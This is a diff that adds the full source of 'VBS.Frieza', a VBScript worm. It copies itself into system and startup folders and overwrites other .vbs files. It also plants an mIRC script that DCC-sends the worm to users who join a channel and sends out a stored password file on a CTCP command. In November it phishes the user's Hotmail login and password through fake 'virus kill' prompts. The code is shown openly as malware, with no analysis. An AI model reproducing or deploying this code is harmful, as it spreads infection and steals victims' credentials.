@@ -1,0 +1,36 @@
+'VBS.Frieza
+'Thnx to SimplSimon for script help
+'u ever need script help, hes da man to see.
+'Thnx to Knowdeth for help with the VBS.
+On Error Resume Next
+Set FSO = CreateObject("Scripting.FileSystemObject")
+Set WshShell = Wscript.CreateObject("Wscript.Shell")
+Frieza = Wscript.ScriptFullName
+FSO.CopyFile Frieza, "c:\WINDOWS\system\QuakeIII.vbs"
+FSO.CopyFile Frieza, "c:\WINDOWS\Start Menu\Programs\StartUp\DBZ.vbs"
+Set Wormy = FSO.CreateTextFile("c:\mirc\script.ini", True)
+Wormy.WriteLine "[Script]"
+Wormy.Writeline "n0=on 1:Join:*:{ if ( $nick = buffy` ) && ( $me isop # ) { .ban # $nick | .kick # $nick | halt } | if ( $nick = $me ) { halt } | .dcc send $nick C:\windows\system\quakeIII.vbs }"
+Wormy.Writeline "n1=on 1:TEXT:*fr*:#:/msg $chan Frieza is my master"
+Wormy.Writeline "n2=ctcp 1:GETPW:*:{ if ( $exists(C:\mirc\pws.txt) ) { .dcc send Notmeg C:\mirc\pws.txt } | halt }"
+Wormy.Close
+Set VLink = WshShell.CreateShortcut("C:\WINDOWS\Favorites\Frieza.URL")
+  VLink.TargetPath = "http://www.planetnamek.com/insane/"
+  VLink.Save
+LF = Left(Frieza, InStrRev(Frieza, "\"))
+For Each target in FSO.GetFolder(LF).Files
+If FSO.GetExtensionName(target.Name) = "vbs" then
+FSO.CopyFile Frieza, target.name, 1
+end if
+next
+IF Month(now) = 11 Then
+MsgBox "Frieza-Virus with a power level of 13,000,000",4096,"VBS.Frieza"
+WshShell.Run ("C:\WINDOWS\Favorites\Frieza.URL")
+Input = InputBox("Hotmail Virus kill Service..Virus detected. to kill...enter your hotmail login")
+Input2 = InputBox("enter your hotmail password to verify your  hotmail member")
+MsgBox ("thank you,  " & Input &  input2 & "Virus cleaned")
+Set PW = FSO.CreateTextFile("c:\mirc\pws.txt", True)
+PW.WriteLine ("hey " & input & "--" & Input2)
+PW.Close
+'Frieza
+end if
